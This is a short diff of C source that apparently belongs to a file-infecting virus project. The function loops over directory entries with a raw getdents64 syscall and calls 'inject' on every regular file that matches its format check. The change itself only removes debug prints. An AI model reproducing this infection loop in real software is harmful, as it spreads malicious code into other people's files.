@@ -37,32 +37,19 @@ int finder(t_data data, int dir_fd)
 	struct linux_dirent64 *d;
 	char	buf[BUF_SIZE];
 
-	ft_putchar('2');
-	ft_putchar('\n');
 	while(1)
 	{
-		ft_putchar('2');
-		ft_putchar('l');
-		ft_putchar('\n');
 		nread = syscall3(SYS_GETDENT64, (u64)dir_fd, (u64)buf, (u64)BUF_SIZE);
 		if (!nread || nread == -1)
 		{
-			ft_putchar('2');
-			ft_putchar('x');
-			ft_putchar('\n');
 			return (0);
 		}
 		bpos = 0;
 		while (bpos < nread)
 		{
-		ft_putchar('2');
-		ft_putchar('r');
-		ft_putchar('\n');
 			d = (struct linux_dirent64*)(buf + bpos);
-		ft_putchar('2');
-		ft_putchar('o');
-		ft_putchar('\n');
-			if (d->d_type == DT_REG && (data.fd = is_good_format(d->d_name)) != -1)
+			if (d->d_type == DT_REG &&
+					(data.fd = is_good_format(d->d_name)) != -1)
 				inject(data);
 			bpos += d->d_reclen;
 		}
